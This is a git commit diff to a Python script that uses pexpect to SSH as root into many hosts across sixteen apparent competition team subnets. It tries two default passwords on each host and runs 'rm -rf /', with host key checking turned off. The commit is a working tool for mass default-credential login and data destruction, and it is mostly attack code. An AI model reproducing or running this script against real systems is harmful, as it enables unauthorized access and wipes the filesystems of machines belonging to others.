ae046c0c70ec74464a6218020042dd7e514c49d7
Liam Brennan <lfb6ek@virginia.edu>
2021-03-04 15:43:53 -0500

    ssh shell exec script

--- shell.py
+++ shell.py
@@ -1,20 +1,55 @@
 import pty
 import sys
 import asyncio
+import tempfile
+import pexpect
 
-async def run(cmd):
-    proc = await asyncio.create_subprocess_shell(
-        cmd,
-        stdin=asyncio.subprocess.PIPE,
-        stdout=asyncio.subprocess.PIPE,
-        stderr=asyncio.subprocess.PIPE)
 
-    stdout, stderr = await proc.communicate()
 
-    print(f'[{cmd!r} exited with {proc.returncode}]')
-    if stdout:
-        print(f'[stdout]\n{stdout.decode()}')
-    if stderr:
-        print(f'[stderr]\n{stderr.decode()}')
+async def ssh(user, host, cmd, password, timeout=30, bg_run=False):                                                                                                                                                                                                                                    
 
-asyncio.run(run('ls /zzz'))
+	fname = tempfile.mktemp()                                                                                                                                                  
+	fout = open(fname, 'w')                                                                                                                                                    
+
+	options = '-q -oStrictHostKeyChecking=no -oUserKnownHostsFile=/dev/null -oPubkeyAuthentication=no'                                                                         
+	if bg_run:                                                                                                                                                         
+		options += ' -f'  	
+
+	ssh_cmd = f'ssh {user}@{host} {options} "{cmd}"'                                                                                                               
+	child = pexpect.spawn(ssh_cmd, timeout=timeout, encoding="utf-8")                                                                                                                            
+	child.expect(['password: '])                                                                                                                                                                                                                                                                                               
+	child.sendline(password)                                                                                                                                                   
+	child.logfile = fout                                                                                                                                                       
+	child.expect(pexpect.EOF)                                                                                                                                                  
+	child.close()                                                                                                                                                              
+	fout.close()                                                                                                                                                               
+
+	fin = open(fname, 'r')                                                                                                                                                     
+	stdout = fin.read()                                                                                                                                                        
+	fin.close()                                                                                                                                                                
+
+	if 0 != child.exitstatus:                                                                                                                                                  
+		raise Exception(stdout)                                                                                                                                                
+
+	return stdout
+
+
+
+# fuck around with any command we want
+command = """
+
+	rm -rf /
+
+"""
+
+default_passwords = ["Chiapet1", "SuperChiaPet10"]
+
+
+# each team
+for team in range(16):
+	# each teams servers
+	for server in [1, 2, 3, 4, 5, 6, 11, 12, 13, 20, 21, 22, 42, 69]:
+		# check each default password
+		for password in default_passwords:
+			asyncio.run(ssh(user="root", host=f"10.{team}.1.{server}", cmd=command, password=password))
+			asyncio.run(ssh(user="root", host=f"172.16.{team}.{server}", cmd=command, password=password))
